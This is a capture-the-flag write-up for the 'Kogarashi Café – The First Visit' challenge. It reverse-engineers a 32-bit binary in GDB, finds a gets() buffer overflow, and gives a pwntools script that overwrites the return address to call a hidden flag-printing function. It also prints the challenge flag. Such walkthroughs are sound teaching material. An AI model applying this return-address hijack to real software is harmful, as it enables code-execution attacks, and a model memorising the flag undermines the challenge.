# Kogarashi Café - The First Visit
## Description
A quiet café, a simple question. The barista waits, but your order may mean more than it seems.

- Author: Suraj
- flag: apoorvctf{c0ffee_buff3r_sp1ll}

**Category : Binary Exploitation**

## Writeup

## Challenge Overview

In this challenge, we're given a binary that simulates a coffee ordering system. Upon analysis, we need to discover and exploit a vulnerability to access a "secret blend" (the flag).

## Initial Analysis

When we run the program, we are greeted with a prompt:

```
Welcome to Kogarashi Café.
Barista: 'What will you have?'
```

After entering our order, the program responds and exits:

```
Barista: '[our input]... interesting choice.'
Brewing...
```

There's no obvious way to see the flag from normal interaction. Let's dig deeper with reverse engineering.

## Analyzing Binary Functions

First, let's enumerate all functions in the binary using GDB:

```
gdb-peda$ info functions
All defined functions:
Non-debugging symbols:
0x080483a4  _init
0x080483e0  setbuf@plt
0x080483f0  printf@plt
0x08048400  gets@plt
0x08048410  fgets@plt
0x08048420  fclose@plt
0x08048430  puts@plt
0x08048440  __libc_start_main@plt
0x08048450  fopen@plt
0x08048460  __gmon_start__@plt
0x08048470  _start
0x080484a0  __x86.get_pc_thunk.bx
0x080484b0  deregister_tm_clones
0x080484e0  register_tm_clones
0x08048520  __do_global_dtors_aux
0x08048540  frame_dummy
0x0804856b  brew_coffee
0x080485e6  order_coffee
0x08048642  main
0x08048680  __libc_csu_init
0x080486e0  __libc_csu_fini
0x080486e4  _fini
```

Among standard library functions and initialization routines, three custom functions stand out:
- `brew_coffee` at address `0x0804856b`
- `order_coffee` at address `0x080485e6`
- `main` at address `0x08048642`

The name `brew_coffee` is intriguing because it suggests functionality that might be useful for solving the challenge.

## Examining the Main Function

```assembly
gdb-peda$ disassemble main
Dump of assembler code for function main:
   0x08048642 <+0>:   lea    ecx,[esp+0x4]
   ...
   0x0804865e <+28>:  call   0x80483e0 <setbuf@plt>
   0x08048666 <+36>:  call   0x80485e6 <order_coffee>
   0x0804866b <+41>:  mov    eax,0x0
   ...
   0x08048677 <+53>:  ret
```

Looking at `main`, we see it only calls `order_coffee()` and then exits. 

## Examining the Order Coffee Function

Let's analyze the `order_coffee` function:

```assembly
gdb-peda$ disassemble order_coffee 
Dump of assembler code for function order_coffee:
   0x080485e6 <+0>:   push   ebp
   0x080485e7 <+1>:   mov    ebp,esp
   0x080485e9 <+3>:   sub    esp,0x28
   ...
   0x0804860f <+41>:  lea    eax,[ebp-0x28]
   0x08048612 <+44>:  push   eax
   0x08048613 <+45>:  call   0x8048400 <gets@plt>
   ...
   0x08048641 <+91>:  ret
```

The `order_coffee()` function allocates a 40-byte buffer on the stack (`sub esp,0x28`) and uses `gets()` to read user input. This is a well-known vulnerable function since it has no bounds checking, allowing us to overflow the buffer.

## Key Discovery: Missing Function Call

After analyzing both `main` and `order_coffee` functions, an important observation emerges: **`brew_coffee` is never called anywhere in the program's normal execution flow**. The `main` function only calls `order_coffee`, and `order_coffee` doesn't call any other functions except those needed for input and output.

This is a significant discovery - we have a function named `brew_coffee` that exists in the binary but is never used. This strongly suggests it contains functionality the challenge author wants us to reach by exploiting a vulnerability.

## Examining the Brew Coffee Function

Now let's look closer at the mysterious `brew_coffee` function:

```assembly
gdb-peda$ disassemble brew_coffee 
Dump of assembler code for function brew_coffee:
   0x0804856b <+0>:   push   ebp
   0x0804856c <+1>:   mov    ebp,esp
   0x0804856e <+3>:   sub    esp,0x98
   0x08048574 <+9>:   sub    esp,0x8
   0x08048577 <+12>:  push   0x8048700
   0x0804857c <+17>:  push   0x8048702
   0x08048581 <+22>:  call   0x8048450 <fopen@plt>
   ...
   0x080485a4 <+57>:  call   0x8048410 <fgets@plt>
   ...
   0x080485bb <+80>:  call   0x80483f0 <printf@plt>
   ...
   0x080485c9 <+94>:  call   0x8048420 <fclose@plt>
   ...
```

The function appears to be opening a file, reading from it, and printing its contents. To understand what file it's opening, we need to examine the memory addresses being pushed before the `fopen` call:

```assembly
0x08048577 <+12>:  push   0x8048700
0x0804857c <+17>:  push   0x8048702
```

To see what strings these addresses point to, we can use GDB to examine them:

```
gdb-peda$ x/s 0x8048702
0x8048702:      "flag.txt"
gdb-peda$ x/s 0x8048700
0x8048700:      "r"
```

Now we know that `brew_coffee()` is opening "flag.txt" in read mode, reading its contents with `fgets()`, and then printing it. This is exactly what we need - a function that reads and prints the flag!

We can further confirm this by looking at the strings referenced in printf:

```
gdb-peda$ x/s 0x804870c
0x804870c:      "Barista: 'A rare choice... here is your secret blend.'\n%s\n"
```

This confirms that this function is designed to print the flag.

## Vulnerability and Exploitation Plan

Now we have a clear path:
1. The `order_coffee()` function has a buffer overflow vulnerability due to `gets()`
2. The `brew_coffee()` function reads and prints the flag but is never called normally
3. Our goal is to hijack program flow and redirect execution to `brew_coffee()`

## Finding the Exact Offset

To redirect execution, we need to find the exact offset to the return address:

1. The buffer in `order_coffee()` is 40 bytes (`sub esp,0x28`)
2. The buffer starts at `ebp-0x28`
3. The return address is stored at `ebp+4`

Therefore, to reach the return address, we need:
- 40 bytes (buffer size)
- 4 bytes (saved EBP)
- Total: 44 bytes of padding

Once we fill these 44 bytes, the next 4 bytes we write will overwrite the return address.

## Crafting the Exploit

With this information, we can craft our exploit using pwntools:

```python
from pwn import *

#p = process("./first_visit")
p = remote('chals1.apoorvctf.xyz','3001')

offset = 44
brew_coffee_addr = 0x0804856b
payload = b"A" * offset + p32(brew_coffee_addr)
p.sendline(payload)
p.interactive()
```

## Execution Walkthrough

When we run the exploit:
1. The program prompts for our coffee order
2. Our payload sends 44 bytes of "A"s to reach the return address position
3. We then append the address of `brew_coffee()` function (0x0804856b)
4. When `order_coffee()` returns, it jumps to `brew_coffee()` instead of back to `main()`
5. The `brew_coffee()` function opens "flag.txt", reads its contents, and prints them

## Flag Retrieval

Upon successful execution, the output should look like:

```
Welcome to Kogarashi Café.
Barista: 'What will you have?'
Barista: 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAk\x85\x04\x08... interesting choice.'
Brewing...
Barista: 'A rare choice... here is your secret blend.'
apoorvctf{c0ffee_buff3r_sp1ll}
```

## Conclusion

This challenge demonstrates a classic buffer overflow attack, where we exploit unsafe input handling to redirect program execution. By understanding the stack layout and performing careful reverse engineering, we can craft a payload that gives us access to the "secret blend" (flag).
